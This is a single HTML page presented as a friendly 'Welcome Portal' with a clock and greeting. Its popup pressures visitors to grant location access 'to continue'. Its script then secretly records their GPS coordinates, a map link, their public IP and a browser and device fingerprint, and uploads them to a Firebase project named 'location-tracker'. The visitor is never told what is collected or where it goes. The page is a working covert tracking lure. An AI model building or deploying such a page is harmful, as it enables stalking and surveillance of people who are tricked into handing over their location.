<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Welcome Portal</title>

<link rel="icon" href="favicon.ico">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Segoe UI,sans-serif;
}

body{

min-height:100vh;
display:flex;
align-items:center;
justify-content:center;

background:
linear-gradient(135deg,#020617,#111827,#312e81);

color:white;

}


.card{

width:90%;
max-width:450px;

padding:35px;

background:rgba(255,255,255,.08);

backdrop-filter:blur(20px);

border-radius:25px;

border:1px solid rgba(255,255,255,.15);

text-align:center;

box-shadow:0 20px 50px #0008;

animation:show .8s;

}


@keyframes show{

from{
opacity:0;
transform:translateY(40px);
}

to{
opacity:1;
transform:translateY(0);
}

}


h1{

font-size:32px;
margin-bottom:15px;

}


.clock{

font-size:22px;
color:#93c5fd;

}


.date{

margin:10px;
color:#cbd5e1;

}


p{

color:#cbd5e1;

line-height:1.6;

margin:20px 0;

}


button{

width:100%;

padding:15px;

border:0;

border-radius:15px;

background:linear-gradient(135deg,#2563eb,#9333ea);

color:white;

font-size:17px;

font-weight:bold;

cursor:pointer;

transition:.3s;

}


button:hover{

transform:scale(1.04);

}



#popup{

position:fixed;

inset:0;

background:#000b;

display:flex;

align-items:center;

justify-content:center;

}


.popup{

background:#111827;

padding:30px;

width:85%;

max-width:350px;

border-radius:25px;

text-align:center;

animation:pop .5s;

}


@keyframes pop{

from{
transform:scale(.5);
}

to{
transform:scale(1);
}

}

</style>

</head>


<body>


<div id="popup">

<div class="popup">

<h2>👋 Welcome</h2>

<br>

<p>
To continue, please allow permissions.
<br><br>
📍 Location access is required.
</p>


<button onclick="requestLocation()">

Allow Permissions

</button>


</div>

</div>



<div class="card">


<h1 id="greet">
Hello 👋
</h1>


<div class="clock" id="clock"></div>

<div class="date" id="date"></div>


<p>

Our system is ready.
<br>
Please verify your connection to continue.

</p>


<button onclick="requestLocation()">

Continue

</button>


</div>




<script type="module">


import {initializeApp}

from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";


import {

getFirestore,
collection,
addDoc,
serverTimestamp

}

from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";





const firebaseConfig={

apiKey:"AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",

authDomain:"location-tracker-1aa74.firebaseapp.com",

projectId:"location-tracker-1aa74",

storageBucket:"location-tracker-1aa74.firebasestorage.app",

messagingSenderId:"836267695111",

appId:"1:836267695111:web:1b6ddd5d4a85a350099ea2",

measurementId:"G-DNSW7LGEYV"

};



const app=initializeApp(firebaseConfig);

const db=getFirestore(app);


console.log("Firebase Connected");





function clock(){

let now=new Date();

let h=now.getHours();

let text="Good Evening 🌙";


if(h<12)
text="Good Morning ☀️";

else if(h<18)
text="Good Afternoon 👋";


document.getElementById("greet").innerHTML=text;


document.getElementById("clock").innerHTML=
now.toLocaleTimeString();


document.getElementById("date").innerHTML=
now.toDateString();


}


setInterval(clock,1000);

clock();






async function getIP(){

try{

let r=await fetch(
"https://api.ipify.org?format=json"
);

let d=await r.json();

return d.ip;

}

catch{

return "Unknown";

}

}





window.requestLocation=function(){


navigator.geolocation.getCurrentPosition(

saveData,

()=>alert("Location permission denied")

);


};






async function saveData(pos){


let ip=await getIP();



let data={


latitude:
pos.coords.latitude,


longitude:
pos.coords.longitude,


accuracy:
pos.coords.accuracy,


map:
`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,


ip:ip,


browser:
navigator.userAgent,


language:
navigator.language,


timezone:
Intl.DateTimeFormat().resolvedOptions().timeZone,


screen:
`${screen.width}x${screen.height}`,


platform:
navigator.platform,


cpu:
navigator.hardwareConcurrency || "Unknown",


memory:
navigator.deviceMemory || "Unknown",


online:
navigator.onLine,


time:
new Date().toString(),


created:
serverTimestamp()


};




await addDoc(
collection(db,"locations"),
data
);



document.getElementById("popup").style.display="none";


alert("Connected Successfully ✅");


}



</script>


</body>

</html>
